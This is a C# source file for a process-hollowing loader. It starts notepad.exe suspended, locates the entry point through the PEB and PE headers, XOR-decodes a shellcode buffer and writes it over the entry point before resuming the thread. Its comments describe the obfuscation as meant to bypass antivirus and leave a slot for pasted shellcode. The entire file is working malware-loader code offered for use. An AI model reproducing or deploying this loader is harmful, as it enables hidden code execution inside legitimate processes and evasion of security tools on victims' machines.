using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using static ProcessHollowing.Program;

namespace ProcessHollowing
{
	class Program
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
		struct STARTUPINFO
		{
			public Int32 cb;
			public IntPtr lpReserved;
			public IntPtr lpDesktop;
			public IntPtr lpTitle;
			public Int32 dwX;
			public Int32 dwY;
			public Int32 dwXSize;
			public Int32 dwYSize;
			public Int32 dwXCountChars;
			public Int32 dwYCountChars;
			public Int32 dwFillAttribute;
			public Int32 dwFlags;
			public Int16 wShowWindow;
			public Int16 cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr Reserved1;
			public IntPtr PebAddress;
			public IntPtr Reserved2;
			public IntPtr Reserved3;
			public IntPtr UniquePid;
			public IntPtr MoreReserved;
		}

		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
		static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern uint ResumeThread(IntPtr hThread);


		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		static void Main(string[] args)
		{
			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();


			// "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
			bool res = CreateProcess(null, "C:\\windows\\system32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
			Console.WriteLine("[+]Process created with id: " + pi.dwProcessId);

			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
			uint tmp = 0;
			IntPtr hProcess = pi.hProcess;

			ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

			//IntPtr ptrToImageBase = (IntPtr)((Int32)bi.PebAddress + 0x08);	// For x86
			IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

			byte[] addrBuf = new byte[IntPtr.Size];
			IntPtr nRead = IntPtr.Zero;
			if (!ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead))
				Console.WriteLine("ReadProcessMemory (PEB) failed: " + Marshal.GetLastWin32Error());
			Console.WriteLine("[+]Pointer to image base address: " + $"0x{ptrToImageBase.ToInt64():X}");

			//IntPtr svchostBase = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));	// For x86
			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

			byte[] d = new byte[0x200];
			if (!ReadProcessMemory(hProcess, svchostBase, d, d.Length, out nRead))
				Console.WriteLine("ReadProcessMemory (image base) failed: " + Marshal.GetLastWin32Error());
			Console.WriteLine("[+]Pointer svc base address: " + $"0x{svchostBase.ToInt64():X}");


			// Obfuscated code to bypass AV
			if (d == null || d.Length < 0x40) throw new ArgumentException();

			// Step 1: DOS header e_lfanew
			uint a = 0;
			for (int i = 0; i < 4; i++) a |= (uint)d[0x3C + i] << (i * 8);

			// Step 2: OptionalHeader offset obfuscated
			uint b = a;
			b += unchecked((0x14 << 1) + 0x0); // 0x28

			// Step 3: AddressOfEntryPoint RVA
			uint c = 0;
			for (int j = 0; j < 4; j++) c |= (uint)d[(int)b + j] << (j * 8);

			// Step 4: Obfuscated pointer arithmetic for x64
			ulong temp = ((ulong)svchostBase) ^ 0x0; // meaningless XOR to confuse
			temp += c ^ 0x0; // meaningless XOR
			IntPtr addressOfEntryPoint = (IntPtr)temp;

			//Console.WriteLine("[+] Entry point address:" + $"0x{addressOfEntryPoint.ToInt64():X}");

			// Paste XORe'd shellcode below
			byte[] buf = new byte[] { 0x10, 0x10, 0x10 };
			//Console.WriteLine("[+] Lenght of code: " + buf.Length);

			// XOR decrypt shellcode using key 0x10
			for (int i = 0; i < buf.Length; i++)
			{
				buf[i] = (byte)(((uint)buf[i] ^ 0x10) & 0xFF);
			}

			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

			ResumeThread(pi.hThread);
		}
	}
}
